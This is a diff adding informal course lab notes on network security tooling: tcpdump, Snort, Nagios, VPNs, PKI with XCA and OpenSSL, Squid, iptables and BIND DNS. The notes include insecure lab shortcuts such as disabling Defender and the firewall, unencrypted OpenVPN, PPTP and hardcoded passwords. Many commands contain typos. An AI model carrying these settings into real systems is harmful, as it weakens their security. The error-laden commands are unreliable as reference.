@@ -1,0 +1,1399 @@
+##tcpdump
+
+#to see interface in tcpdump
+tcpdump -D
+
+#to use interface
+tcpdump -i <interface>
+
+#tcpdump filter
+tcpdump -i ens33 udp
+
+#tcpdump capture only 2 packets
+tcpdump -i ens33 udp -c 2
+
+#tcpdump no name resolution(it will save time from resolving name)
+tcpdump -i ens33 udp -n -c 2
+
+#tcpdump to write a capture packets file
+tcpdump -i ens33 udp -c 2 -w one.two
+
+#tcpdump to read the capture file
+tcpdump -r one.two
+
+#tcpdump filter based on ip
+tcpdump host <ip>
+
+#tcpdump filter based on destination ip
+tcpdump dst.host <ip>
+
+#tcpdump filter based on network id
+tcpdump net <ip_range/<subnet bit>>
+
+#tcpdump filter based on source ip
+tcpdump src.host <ip>
+
+#tcpdump based on src port filtering
+tcpdump src.port 22
+
+#tcpdump filter based on destination port filtering
+tcpdump dst.port 22
+
+#tcpdump filter based on port range
+tcpdump port range 20-23
+
+#condition based filtering
+tcpdump -i ens33 '((tcp)&(port 80))&((dst.host <ip>) or  (dst.host <ip>))'
+
+#tcpdump to get signle packets with extra header
+tcpdump -c 1 -xxe
+
+#tcpdump to get first 8 bytes of packets
+tcpdump -c 1 -s 8 xxe
+
+
+##Snort Configuration on windows
+
+ install SNORT
+* run on diffrent modes: 
+    * 1. packet capturing mode.
+    * 2. IDS mode.
+        * configure.
+
+### **Prerequisit:**
+* winpcap install
+
+### **settings:**
+* On the extension flag on view option so we can see every file extension.
+* make a folder named Snort.
+* make sure you defender firewall off.
+* download Snort installer.
+* download winpcap software
+* install > next > next > ok 
+* by default snort location is in C: snort > bin > snort.txt 
+* etc - snort (snort config file)
+* log - (log folder for snort)
+* rules - (rules for snort and it intially empty)
+
+## **snort must run on CLI and CLI is in run as Administrator mode.**
+
+> c:\snort\cd bin
+* to run snort
+> snort
+* (snort give pid.)
+
+> snort -W
+* (-W to see/list the interfaces)
+* list will display and choose the lan interface
+
+> getmac /fo csv /v
+(format the file in the csv format. this  will shows the actual name and details of connected network interfaces)
+
+> snort -i 2
+(go to 2nd interface)
+
+> snort -i 2 -dev
+
+* where:
+   * d -  application layer data
+   * e - link layer data
+   * v - verbose
+
+* we can see and capture packets.
+
+
+## **Run Snort in IDS mode.**
+
+* to run in ids mode we want rule
+* so we download the rule 
+* while it doing antivirus will defend it (so we off the defender.)
+* open defender - mannage setting - exclueion- add - add the software and snort folder 
+* now the snort can be easily download
+* tar.gzip file extrat this 2 times
+* we will get tar file.
+* through 7 zip extract file- select snort path (c:\snort) - unchek the box - overrid without prompt- ok press.
+* If there is no any folder just assume you have run something wrong and do it from starting !
+
+> snort -i 2 
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+* (where -c is configuration file, -l is log, -A is alert) 
+
+## **Error1 : (ipvar)**
+* line 44 onwards
+* replase ipvar with var ( there must be 11 occurance)
+* (Solution- replace ipvar to var …only 11 ipvar should be there. Make sure to save it)
+
+* (how to replace the words in notpad -Click Edit > Replace in the menu bar)
+
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+
+## **Error2 : (snort_dynamicpreprossessor)**
+* line 247 find the /usr/local/lib/snort_dynamicpreprossessor/
+* (coment this line)
+* inanother notepad copyt the path in window.
+* dynamicpreprossor c:Snort\lib\snort_dynamincpreprossessor\sf_dce2.dll
+* (do it the same process and add this in the configuration like above format.)
+* Make sure to save it
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+
+## **Error3: (snort_dynamicengine)**
+* line 265 under the base processor engine
+* change the path form linux to window 
+* dyanaicenginge c:\Snort\lib\snort_dynamicengine\sf_engine.dll
+* Make sure to save it
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+
+## **Error4: (ssnort_dyanamicrules)**
+* under line 267
+* create an empty directory 
+* dyameicdetection diresctory c:\Snort\lib\snort_dyanamicrules
+* Make sure to save it
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+
+
+## **Error5: (normalize_ip4)**
+* line 279
+* comment out the next 6 line
+* (Solution:-  go to  conf file. Find normalize_ip4 and comment lines under Does nothing in IDS mode.)
+* Make sure to save it
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -A console -i 2
+
+## **Error6: (white_list.rules)  file is not there.**
+* snort - rule - create white_list.rules (this is the text document not directroy)
+* Solution - create a file name white_list.rules in the rules folder.  Always make sure to not have .txt as extension.
+* Make sure to save it.
+
+
+## **Error7: (black_list.rules) is not there**
+* make this file inside the rule
+* Solution- create a file name black_list.rules in the rules folder. Make sure to not have .txt extension.
+* Make sure to save it.
+
+* (to verify T stands for test)
+> snort -c c:\Snort\etc\snort.conf -l c:\Snort\log -T -i 2
+
+* to wite the rule: 
+> alert ip any any -> any any (msg: "IP Packets"; sid: 1000001;) 
+where
+* any source ip 
+* any source port
+* -> is redirection
+* any dst ip 
+* any dst port
+
+* and place it inside rule name myrule.rule
+* (Create an empty file in snorts/rules  myrules.rules
+* In that file write 
+```
+alert ip any any -> any any (msg: “blabla”); sid : 1000001;)
+```
+* **First any is source ip  , second any is source port, third any is destination ip and 4th any is destination port**
+
+* add the myrule.rule file in step 7
+
+
+##Snort with remote log system
+edit the file snort.conf and add in step 6
+Output alert_syslog: host: <ip>:514, log_Auth log_Alert
+
+snort -i 2 -c <config file location> -l /log/ -S
+
+
+## **LAB PKI: Encrypting File System(EFS)**
+
+*	make demo files 
+*	be in that file and run command cipher
+>	cipher /e  one\oneone (/e for encryption one\onene is folder or file)
+>	cipher one\oneone\* 
+>	cipher /e /s:two  (for encrypt recursively)
+
+* if anybody takes our harddisk they can not copy our files!
+
+* microsoft windows feature
+* introduced in version 3.0 of NTFS
+* provides filesystem-level encryption 
+* uses a combination of public key cryptography and sysmmetric key cryptography.
+
+
+##Nagios on Linux server
+
+#first reset the date
+sudo dpkg-reconfigure tzdata
+
+#dependency(16)
+sudo apt-get install -y apache2 apache2-utils autoconf gcc libc6 libgd-dev make php python python3 tree unzip wget libkrb5-dev openssl libssl-dev
+
+#download and verify Nagios 4.5.0 from  lab server
+cd /tmp/
+wget nagios-4.4.5.tar.gz
+tar -xvf nagios
+sudo ./configure
+sudo ./configure --with-http-conf=/etc/apache2/site-enabled/
+sudo make all
+sudo make install-groups-users
+sudo usermod -a -G nagios www-data
+sudo make install
+ls -l /usr/local/nagios (NO FILES IS THERE)
+sudo make install
+ls -l /usr/local/nagios/bin/
+sudo make install-daemon-init ( to run it as service)
+sudo make install-commandmode (enabel the command mode)
+sudo make install-config (there is no etc folder in /usr/local/nagios/ after this command verify etc file is there)
+sudo make install-webconfig  (to install apache config file)
+to enable apache module url rewrite and cgi(common gatway interface)
+sudo a2enmod rewrite
+sudo a2enmod cgi
+sudo htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin
+sudo /usr/local/nagios/bin/nagios -v /usr/local/nagios/etc/nagios.cfg
+restart nagios and apache2
+
+##Nagios Plugin installation(11)
+sudo apt-get install -y automake autotools-dev bc build-essential dc gawk gettext libmcrypt-dev libnet-snmp-perl libssl-dev snmp
+
+download plugin
+extract xvf nagios plugin
+sudo ./configure
+sudo make all
+sudo make install
+
+##Nagios agent on Windows to monitor
+NCPA nagios cross platform agent
+specifies token(password)
+port no (5693)
+
+download and and extract file of ncpa-plugin in nagios/libexec
+change the she-bang header to python3 of ncpa file
+sudo ./check_ncpa.py -V
+sudo ./check_ncpa.py -t '<password>' -H <ip> -M memory/virtual
+under this add command block 
+go to last line of the file and add this.
+sudo nano /usr/local/nagios/etc/objects/commands.cfg
+define command {
+	command_name 	check_ncpa
+	command_line 	$USER1$/check_ncpa.py -H $HOSTADDRESS$ $ARG1$ 
+}
+sudo nano /usr/local/nagios/etc/nagios.cfg
+Uncomment the below line
+cfg _dir=/usr/local/nagios/etc/servers
+create the severs folder under etc and under that create any file with .cfg extension
+sudo mkdir /usr/local/nagios/etc/servers
+sudo nano  /usr/local/nagios/etc/objects/templates.cfg
+Comment hostgroups window-servers
+sudo vim /usr/local/nagios/etc/servers/win10-1.cfg
+define host{                                                                                                                           
+        use                     windows-server
+        host_name               win10-1
+        alias                   windows 10 sys 1
+        address                 192.168.80.131
+        max_check_attempts      5
+}
+define service{
+        use                     generic-service
+        host_name               win10-1
+        service_description     NCPA Agent Version
+        check_command           check_ncpa!-t 'Password1234' -p -P 5693 -M system/agent_version
+}
+
+define service{
+        use                     generic-service
+        host_name               win10-1
+        service_description     CPU Average
+        check_command           check_ncpa!-t 'Password1234' -p -P 5693 -M cpu/percent -w 20 -c 40 -q 'aggregate=avg'
+}
+restart nagios
+and forcefully restart service
+sudo  /usr/local/nagios/bin/nagios -v /usr/local/nagios/etc/nagios/cfg
+uncomment the line host on windows servers
+
+
+##Nagios ncpa agent for linux 
+#dependency(3)
+sudo apt-get install wget libsqlite3-0 libssl3
+download ncpa package .deb file
+dpkg -i ncpa.deb
+nano /usr/local/ncpa/etc/ncpa.cfg
+change community string and treat it as a password for agent
+restart ncpa 
+on nagios server
+in nagios /etc/server add linux-1.cfg
+define host{
+        use                     linux-server
+        host_name               linux-1
+        alias                   linux Sys 1
+        address                 192.168.80.129
+        max_check_attempts      5
+        notifications_enabled   1
+        notification_period     24x7
+        notification_interval   1
+        check_interval          2
+        notification_options    d,u,r,f,s
+        contacts                nagiosadmin
+}
+
+define service{
+        use                     generic-service
+        host_name               linux-1
+        service_description     83985-NCPA Agent Version
+        check_command           check_ncpa!-t 'test' -p -P 5693 -M system/agent_version -v
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     CPU Average
+    check_command           check_ncpa!-t 'test' -P 5693 -M cpu/percent -w 70 -c 80 -q 'aggregate=avg'
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     Virtual Memory
+    check_command           check_ncpa!-t 'test' -P 5693 -M memory/virtual -w 70 -c 90
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     Processes
+    check_command           check_ncpa!-t 'test' -P 5693 -M processes -w 50 -c 80
+}
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     Uptime
+    check_command           check_ncpa!-t 'test' -P 5693 -M system/uptime
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     Server Name
+    check_command           check_ncpa!-t 'test' -P 5693 -M system/node
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     C Drive
+	check_command           check_ncpa!-t 'test' -P 5693 -M 'disk/logical/|' -w 70 -c 90
+}
+
+define service {
+    use                     generic-service
+    host_name               linux-1
+    service_description     Network Interface
+    check_command           check_ncpa!-t 'test' -P 5693 -M interface/ens33  -w 70 -c 80
+}
+
+sudo  /usr/local/nagios/bin/nagios -v /usr/local/nagios/etc/nagios/cfg
+restart nagios server	
+
+
+##Nginx reverse proxy
+
+to remove/disable the webserver
+rm -rf /etc/ngnix/sites-enabled/
+
+sudo nano /etc/nginx/sites-available/rp.conf
+
+server {
+        listen 80;
+        location /{
+        proxy_pass http://192.168.80.130;
+        }
+}
+create soft link (for enabling configration file we create soft link)
+sudo ln -s  /etc/nginx/sites-available/rf.conf  /etc/nginx/sites-enabled/
+
+##Apache2 with https(self signed certificate)
+sudo which apache2 openssl
+sudo a2enmod ssl
+sudo a2ensite default-ssl
+sudo mkdir /etc/apache2/ssl 
+generate private key and public key
+sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt
+country name 
+IN
+MH
+Pune
+ShuHaRi Labs
+IS
+common name: 192.168.80.128
+email: info@shuharilabs.local 
+ls -l /etc/apache2/ssl/
+sudo chmod 600 /etc/apache2/ssl/*
+sudo nano /etc/apache2/sites-available/default-ssl.conf
+type following line under the ServerAdmin
+ServeName 192.168.80.128:443
+Scroll Down  below SSLEngine on change the path to : 
+SSLCertificateFile /etc/apache2/ssl/apache.crt
+SSLCertificateKeyFile /etc/apache2/ssl/apache.key
+sudo systemctl  reload apache2
+sudo systemctl restart apache2
+
+##Vpn lab Openvpn
+To display detailed information about network interfaces on a system. 
+ip a
+install Openvpn
+sudo apt-get install openvpn
+To make configuration file.
+sudo nano server.conf
+Type in that the following: 
+proto udp
+port 1194
+dev tun
+auth none
+cipher none
+ifconfig 10.8.0.1 10.8.0.2
+verb 3
+To open the openvpn and create the tun0 port i,e while starting the openvpn the tun0 interface will be create.
+openvpn --config server.conf
+make sure to on the window terminal
+Go to windows machine (Windows 7)
+install VPN software
+adapter will create
+progream - openvpn technon- oppenvpn - core-openvpn.exe 
+copy the above server.conf date in the above file
+remote 192.168.80.138 <debian ip>
+proto udp
+port 1194
+dev tun
+auth none
+cipher none
+ifconfig 10.80.0.2 10.80.0.1
+verb 3
+on cmd in core path type
+> openvpn --config server.conf
+now install Apache on linux
+go to windows browser type the ip of Apache default page will open.
+and type to vpn ip also Apache default page will open through tunnel.
+
+##Lab 02: VPN 
+sudo tcpdump not port 22
+sudo tcpdump 'icmp and not port 22' -i ens33
+sudo tcpdump 'icmp and not port 22' -i tun0
+
+##PKI Digital certificate
+m1 required i,e windows
+software required XCA
+to store certificate
+myfiles- mypki- DITISS
+crating and storing the database. and take a backup.
+key is password protected
+creat new template - fill the subject 
+cn IN
+MH
+pune
+CN
+email :abc@shuharilabs.local
+org: shuhariLabs
+to create the ROOT CA
+create a private key named e.g RootCA private key
+certicicat3e- new certificate - appley subject (automatically fill data)- give name to certiifvate - shuhari root certifivate.- select CA
+apply extension - go to advanced the corrosponding enrtry is genterated. click ok. 
+now root ca is ready
+to create sub ca
+gerntate pirvate key  - certi- new cert - shuhari root ca- app ly shu tempalar - apply sub - subca ceritfivate- priveter key - apply extension   time range- 5 - key generated- 
+cerate user - tinku private key- apply templet- apply sudo je- tinku su- apply extension - advanded digital signature- ok and get certifivate is ready
+cert - windows certificate- personael certificvate 
+on xca -export - select .exf extension- give password
+all task - import - all files - selct - open - give the passworkd - next- next- finish
+create pdf file - view more- use a certifivate - make mark - digital signature.  
+
+##XCA with apache2
+creat a database and set to password in XCA.
+crate a Private key for RootCA. 
+crate a template. 
+create a self sign certificate for RootCA.
+Select the template name and apply subject and check the subject section for the entries from the templates.
+Now select template as Defautl CA 
+apply extension
+go to extension tab and give time range.
+check details in Advanced tab.
+Select OK.
+To make Sub CA
+create a Private Key for SubCA
+Create a new certificate using RootCA under cheking the use this Certificate for Signing.
+Select the template name and apply subject and check the subject section for the entries from the templates.
+apply the subject
+in subject tab give the enteries of Internal Name and Comman Name.( It should be Same.)
+Now select template as Defautl CA 
+apply extension
+Set the extension year less than the year given to RootCA.
+apply.
+check details in Advanced tab.
+Select OK.
+to make STL server Certificate
+right click on SubCA and Click on New Certificate.
+select the SubCA 
+Select the template name and apply subject and check the subject section for the entries from the templates.
+apply the subject
+in subject tab give the enteries of Internal Name and Comman Name.( **It should be Same as an website name** )
+Go to the source tab, select the TLS_Server template and apply extension
+Set the extension year less than the year given to SubCA.
+apply.
+check details in Advanced tab.
+Select OK.
+Export the Website certificate to a folder and also set export format to the PEM chain (*.pem) 
+ok
+Go to the private key tab and Export the STL Certificate Private Key
+right click on STL Certificate > export > files
+and kept it in export format PEM private(*.pem)
+Ok
+
+shift to debian machine 
+firstly Apache and openssl service should be installed on Debian Machine. To install apache2 and openssl:
+sudo which apache2 openssl
+To enable the SSL Module for the Apache Web Server(httpd)
+sudo a2enmod ssl
+To enable a virtual host configuration file for the default SSL site in Apache.
+sudo a2ensite default-ssl
+sudo mkdir /etc/apache2/ssl 
+Copy the STL Certificate and Private key form the windows machine and get it into the Debian machine using scp and paste those file in ssl directory**
+ls -l /etc/apache2/ssl/
+sudo nano /etc/apache2/sites-available/default-ssl.conf
+type following line under the ServerAdmin
+ServeName 192.168.80.128:443
+Scroll Down  below SSLEngine on change the path to : 
+SSLCertificateFile /etc/apache2/ssl/<STL_Certificate>.pem
+SSLCertificateKeyFile /etc/apache2/ssl/<Private key of STL Certificate>.pem
+sudo systemctl  reload apache2
+sudo systemctl restart apache2
+go to the windows/debian hosts fils and give the entry in that
+<system IP>     <Domain Name>
+lastly enter the Domain Name in browser 
+the certificate colour should be green and secure without any error.
+
+##VPN windows server
+vm send ctrl alt delete - (to unlock the cursor)
+dashboard open 
+add roles and features
+wizard will open - next- next -
+chose remote access service
+next - check direct acess vpn 
+next 
+In tools tab click RR(routing and remote access)
+wizand open 
+right cliclk on red dot 
+wizard will open 
+next 
+check custom configureation
+check vpn
+ok 
+finish
+it will show green dot.
+right cli server name 
+properites
+go to ipv4 tab
+click on static.
+in that give the range ip on which network you have to acess..
+click add 192.168.80.101 to 192.168.80.105
+clic apply
+ok 
+now create a user
+tools
+computer managemetn 
+local user and group
+right clic new user
+given name and password.
+right click on user 
+got ot properites 
+select dialin 
+allow access - ok.
+search network and internet - vpn 
+add vpn 
+give name 
+give ip of another machine
+type pptp
+password - tinku
+on the server
+close the firewall 
+vpn addoptor willl show
+click connect
+
+##PKI TLS_server
+comman 
+select tls sereer 
+extension 1yr
+sudb ca
+export on apache 
+export private key 
+export certificate 
+select(*.pem)
+go to vm debian machine
+ping www.shuharilabs.local
+
+##Squid reverse proxy
+sudo apt-get install squid
+sudo cp /etc/squid/squid.conf /etc/squid/squid_copy.conf
+The SQUID configuration file is divided into sections and TAGs.
+So we have to make changes in TAGs.
+Search for TAG: acl  (line 865)
+acl shuhari_users dstdomain <squid ip> 
+Serach for TAG: http_access
+http_access allow shuhari_users
+Search the TAG:http_port
+http_port 3128 accel defaultsite=<ip of SQUID mahcine> vhost
+Search TAG: cache_peer  (it is supplyer)
+cache_peer <Apache machine IP> parent 80 0 no-query originserver name=shuhari
+Search TAG:cache_peer_access
+cache_peer_access shuhari allow shuhari_users
+cache_peer_access shuhari deny all
+sudo systemctl restart squid
+<SQUID Machine ip>:3128
+
+##Squid roubin round pattern
+squid load balancing by round robin /Server farming /Load balancer
+cache_peer 
+Search the TAG:http_port
+http_port 80 vhost
+before name type round-robin weight=1 name=deb2
+round-robin weight=1 name=deb3
+sudo systemctl restart squid
+For 2 machine to make it load balancer
+All the steps are same , there are changes only in 
+TAG: cache_peer 
+cache_peer 192.168.80.129 parent 80 0 no-query originserver round-robin weight=1 name=deb2
+cache_peer 192.168.80.130 parent 80 0 no-query originserver round-robin weight=1 name=deb3
+
+
+## Lab : iptables in linux
+* Task:  
+* confiugre Statefull Packet Inspection firewall
+    * allow all outbound
+    * deny all inbound new connections
+
+* deb2 .130
+* install the ssh server on deb2 port 22
+* connect the ssh of deb 1
+* install apache2 port 80
+* install link (command line browser)
+
+
+* deb1 .128
+
+* install ssh server on deb1 port 22
+* test the working of ssh by connecting to it. (ssh 127.0.0.1)
+* install apahce port 80
+
+
+* sudo apt-get install iptables
+* to show the list of iptables (here filter table is default iptables)
+> sudo iptables -L	   (L stands for list)
+
+> iptables -P INPUT DROP
+> iptables -P FORWARD DROP
+
+> sudo iptables -L 
+* check the ssh connection : 
+> ssh shuhari@127.0.0.1
+
+> iptables -A INPUT -i to -j ACCEPT
+* (whre -A is append , -i is input, -j is jump to target)
+
+> sudo iptables -L -V (here -V is verbos give detail info of iptables)
+
+* To accept the estabilished packet 
+> iptables -A INPUT -m state --state ESTSBILISHED -j ACCEPT
+
+* To delete all the rules 
+> iptables -F 
+* (-F is flush the rules)
+
+### Automating iptables:
+**nano fw.sh** 
+
+```
+iptables -F
+iptables -p INPUT DROP
+iptables -p OUTPUT ACCEPT
+iptables -p FORWARD DROP
+
+iptables -A INPUr -i lo -j ACCEPT
+iptables -A INPUT -m state ESTABILISHED,RELATED -j ACCEPT
+
+iptables -A INPUT -P tcp --dport 22 -j ACCEPT
+
+iptables -A INPUT -s 192.168.80.10 -j ACCEPT
+iptables -A INPUT -s 192.168.80.20 -j ACCEPT
+iptables -A INPUT -s 192.168.80.30 -j ACCEPT
+
+iptables -L
+
+**iptables software**
+*	mkdir /etc/iptables
+*	sudo sh -c “iptables-save > /etc/iptables/rules.v4” ( .v4 stands for version 4)                           
+*	ls -l /etc/iptables
+*	iptables-save
+## Install the software iptables-persistent
+
+## PKI using Openssl
+// make change the domain in subca.cnf file and change the domain name undr [alt_names] section
+deb1 - Root CA
+deb2 - Sub CA
+deb3 - Webserver
+
+- Create the directory strcture
+
+- create the directory in home directory named CA
+- private key store inside the private we hacve to secure it using chmod.
+
+```
+### The CA database consist of four files 
+    * index file 
+    * Attribute file
+    * Serial Number files   
+        * Certificate serial number files
+        * CRL number files.
+```        
+- creat the empty file index.txt
+- another empty files index.txt.attr
+- another file serial 
+- another file crlnumber
+
+put the number 1000 in crlnumber and serial file.
+
+
+* download the template file inside the ca folder
+* file name is rootca.cnf
+inside the rootca.cnf file give path.
+dir     - /home/shuhari/ca
+
+
+## creation of private key 
+check openssl 
+install openssl
+
+> openssl genrsa -aes256 -out private/ca.key.pem 4096
+- enter the pem pass phrase i,e password
+* sercure the private key make it read only for the current user.
+
+# creation of self sign certificate
+
+> •	openssl req -config rootca.cnf -key private/ca.key.pem -new -x509 -days 7300 -sha256 -extensions v3_ca -out certs/ca.cert.pem
+
+•	Here key is used to digitally sign the certificate
+o	IN
+o	MH
+o	Pune
+o	org name : Shuhari Labs
+- operation unit IS
+- give commanname shuhari Root CA
+- email: info@shuhari.local
+
+to secure the certificate make it read only for everyone.
+> chmod 444 certs/ca.cert.pem
+
+## deb 2 
+* create folder subca 
+* subca 
+    - certs
+    - crl
+    - csr
+    - newcerts
+    - private
+
+* - secure the privat folder.
+> chmod 700 private
+
+* - create the four database file 
+* - make a file in index.txt, index.txt.attr, crlnumber, serial
+* - on the crlnumber and serial file put the data.
+* - put 1000 in crlnumber and serial file
+
+# to create the template 
+- download the template file subca.cnf file.
+
+* in to that change the path 
+dir     - /home/shuhari/subca
+
+* to generate the private key.
+> openssl genrsa -aes256 -out private/subca.key.pem 4096
+and make it private by readonly
+> chmod 400 private/subca.key.pem
+
+
+*  to make the csr in deb2 machine 
+> openssl req -config subca.cnf -new -sha256 -out csr/subca.csr.pem -key 
+country  : IN
+stat    : MH
+locality : pune
+org name: shuhari labls
+org unit IS
+comman name : Shuhari Sub CA
+email address: Info@shuhari.local
+
+
+* bring sunca.csr.pem in deb1 under subca
+
+# shift in deb1 
+to signe the sub
+> openssl ca -config rootca.cnf -extensions v3_intermediate_ca -days 3650 -notext -md sha256 -in subca/csr/subca.csr.pem -out subca/certs/subca.cert.pem
+put it root ca private key passowod in pass phrase.
+yes
+yes
+•	md5sum newcerts/1000.pem subca/certs/subca.cert.pem
+
+cat index.txt.attr
+cat serial 
+
+send subca.cert.pem to deb2 machine under subca/certs/
+
+
+
+# shift to deb 3
+* create a folder named certs in home directory
+sub ca will issue the certificate file to webserer
+- download the subca.cnf
+
+* generrate private key for swebservver
+> openssl genrsa -out www.shuhari.local.key.pem 2048
+//* secure the private key
+//> chmod 400 www.shuhari.local.key.pem
+*  no edit requird in subca.cnf file.
+
+•	Generate the csr 
+•	openssl req -config subca.cnf -key www.shuhari.local.key.pem -new -sha256 -out www.shuhari.local.csr.pem
+IN
+MH 
+Pune
+org name Shuhari labs
+org unit: IS
+comman name www.shuhari.local
+email : info@shuhair.local
+
+Send www.shuhari.local.csr.pem to sub ca csr directory.
+
+- to issu certificate from csr
+> openssl ca -config subca..cnf -extensions server_cert  -days 375 -notext -md sha256 -in csr/www.shuhari.local.csr.pem -out certs/www.shuhari.local.cert.pem
+- enter the pass of sub ca private key.
+
+* Copy it to web server
+
+* Copy certificate form subca to web server. (www.shuhari.local.cert.pem)
+* •	We need to create chain certificate so browser can identify it.
+
+bring the certificate form deb 1 and deb 2 in deb 3 machine 
+bring the www.shuhari.local.pem, subca.cert.pem and ca.cert.pem in www-subca-rootca-bundle.cert.pem 
+
+
+* We need to create chain certificate so browser can identify it
+* In deb 3 machine to make a bundle: 
+> cat www.shuhari.local.cert.pem subca.cert.pem ca.cert.pem > www-subca-rootca-bundle.cert.pem
+
+> cat www-subca-rootca-bundle.cert.pem | less
+•	sudo nano /etc/apache2/sites-available/default-ssl.conf
+Under search engine write the path as
+ Certificate	/etc/apache2/ssl/www-subca-rootca-bundle.cert.pem
+		Keyfile	/etc/apache2/ssl/www.shuhari.local.key.pem
+•	sudo systemctl start apache2
+•	Goto browser enter www.shuhari.local
+
+
+• Add the shuhari certificate 
+go to certmgr.msc- trusted - all task imaport ca.cert.pem
+
+## DNS
+server configuration
+# get the root privelleges
+> sudo -i
+
+# check if dns is already installed
+> rpm -q bind
+
+# install dns server
+> yum install -y bind bind-utils
+
+# open the configuration file for bind
+> vim /etc/named.conf
+
+# comment the line 11 and 12
+# // listen-on port 53 { 127.0.0.1; };
+# // listen-on-v6 port 53 { ::1; };
+
+# configure the line no 19
+# > allow-query     { localhost; <network ip>; };
+> allow-query     { localhost; 192.168.227.0/24; };
+
+# add following sections
+// forward zone
+zone "example.local" IN {
+        type master;
+        file "example.com.db";
+        allow-update { none; };
+        allow-query { any; };
+};
+
+// backward zone
+zone "227.168.192.in-addr.arpa" IN {
+        type master;
+        file "example.com.rev";
+        allow-update { none; };
+        allow-query { any; };
+};
+
+
+# check if the named configuration is OKAY
+> named-checkconf
+
+# add following contents in /var/named/example.local.db
+> vim /var/named/example.local.db
+
+$TTL 86400
+@ IN SOA dns-primary.example.local. admin.example.local. (
+        2020011800 ;Serial
+        3600 ;Refresh
+        1800 ;Retry
+        604800 ;Expire
+        86400 ;Minimum TTL
+)
+
+;Name Server Information
+@ IN NS dns-primary.example.local.
+
+;IP Address for name server
+dns-primary IN A 192.168.227.146
+client IN A 192.168.227.155
+
+# add following contents in /var/named/example.local.rev
+$TTL 86400
+@ IN SOA dns-primary.example.local. admin.example.local. (
+        2020011800 ;Serial
+        3600 ;Refresh
+        1800 ;Retry
+        604800 ;Expire
+        86400 ;Minimum TTL
+)
+
+;Name Server Information
+@ IN NS dns-primary.example.local.
+
+;IP Address for name server
+dns-primary IN A 192.168.227.146
+client IN A 192.168.227.155
+
+;Reverse lookup for name server
+146 IN PTR dns-primary.example.local
+155 IN PTR client.example.local
+
+# check the configuration
+> named-checkzone example.local /var/named/example.local.db
+> named-checkzone example.local /var/named/example.local.rev
+
+# change the ownership of both the files
+> chown named:named /var/named/example.local.db
+> chown named:named /var/named/example.local.rev
+
+# set the host name
+> hostnamectl set-hostname dns-primary.example.local
+> reboot
+
+# start the server
+> systemctl start named
+
+# enable the server
+> systemctl enable named
+
+# check the named server status
+> systemctl status named
+
+# configure firewall
+> firewall-cmd --add-service dns --permanent
+> firewall-cmd --reload
+> firewall-cmd --list-services
+
+```
+
+## client configuration
+
+```bash
+
+# get the root terminal
+> sudo -i
+
+# change the host name
+> hostnamectl set-hostname client.example.local
+> reboot
+
+# change ip address of dns server
+> vim /etc/resolv.conf
+
+# check if server and client can be resolved
+> nslookup dns-primary.example.local
+> nslookup client.example.local
+
+
+## Snort on linux 
+* Download daq-2.0.7.tar.gz from local server. 
+* Download snort-2.9.20.tar.gz from local server.
+* Download snort_sym.sh from local server.
+Install the dependencies(14)
+sudo apt-get install -y bison ca-certificates flex gcc libdumbnet-dev libluajit-5.1-dev libnghttp2-dev libpcap-dev libpcre3-dev libssl-dev make openssl wget zlib1g-dev
+To make Data Aquasition Library (DAQ).
+sudo mkdir -p /usr/src/snort_src
+change the directory
+cd /usr/src/snort_src
+Download and extract source code from local server.
+sudo wget http://192.168.100.192/sw/sec_tools/ids/snort/daq/daq-2.0.7.tar.gz
+Extract the file.
+sudo tar -zxf daq-2.0.7.tar.gz
+change the directory.
+cd daq-2.0.7
+To execute the configuration file and install daq file.
+sudo ./configure
+sudo make 
+sudo make insall
+To restart the application or (For library issues you restart the machine )
+sudo ldconfig
+To download and install snort to create symbolic links from server
+cd /usr/src/snort_src
+wget snort_sym.sh
+sudo chmod 755 snort_sym.sh
+sudo ./snort_sym.sh
+echo $?
+to download snort source code.
+wget snort-2.9.20.tar.gz
+change directory to snort.src
+sudo tar -zxf sort-2.9.20.tar.gz
+cd snort-2.9.20
+To restart the application or (For library issues you restart the machine )
+sudo ./configure
+sudo make 
+sudo make install
+To verify snort is installed or not.
+sudo which snort
+check the working of snort
+sudo snort -i ens33
+to check the snort in ids mode.
+for that create seprate user.
+come to home directory.
+sudo groupadd snort
+sudo useradd snort -r -s /usr/sbin/nologin -c SNORT_IDS -g snort
+To make the directory of rules,snort and snort_dynamicrules
+sudo mkdir -p /etc/snort/rules
+sudo mkdir /var/log/snort
+sudo mkdir /usr/local/lib/snort_dynamicrules
+to copy configuration file
+sudo cp /usr/src/snort_src/snort-2.9.20/etc/*.map /etc/snort/
+sudo cp /usr/src/snort_src/snort-2.9.20/etc/*.conf* /etc/snort
+To Create the Rules files.(i,e White_list.rule, black_list.rules, local.rules)
+sudo touch /etc/snort/rules/white_list.rules
+sudo touch /etc/snort/rules/black_list.rules 
+sudo touch /etc/snort/rules/local.rules
+To change the permission of snort files.
+sudo chmod -R 5775 /etc/snort/  
+sudo chmod -R 5775 /var/log/snort/
+sudo chmod -R 5775 /usr/local/lib/snort_dynamicrules/
+sudo chown -R snort:snort /etc/snort/
+sudo chown -R snort:snort /var/log/snort/
+sudo chown -R snort:snort /usr/local/lib/snort_dynamicrules/
+Please take backup of snort.conf file.**
+Enter to snort.conf file
+sudo nano /etc/snort/snort.conf
+make the following changes in the snort.conf file.
+Change the path 
+var RULE_PATH			/etc/snort/rules
+var  SO_RULE_PATH		/etc/snort/so_rules
+var PREPROC_RULE_PATH  	/etc/snort/preproc_rules
+Give the absolute path to white_list and black_list.
+var WHITE_LIST_PATH 		/etc/snort/rules 
+var BLACK_LIST_PATH 		/etc/snort/rules
+Go to Step 7 in snort.conf file
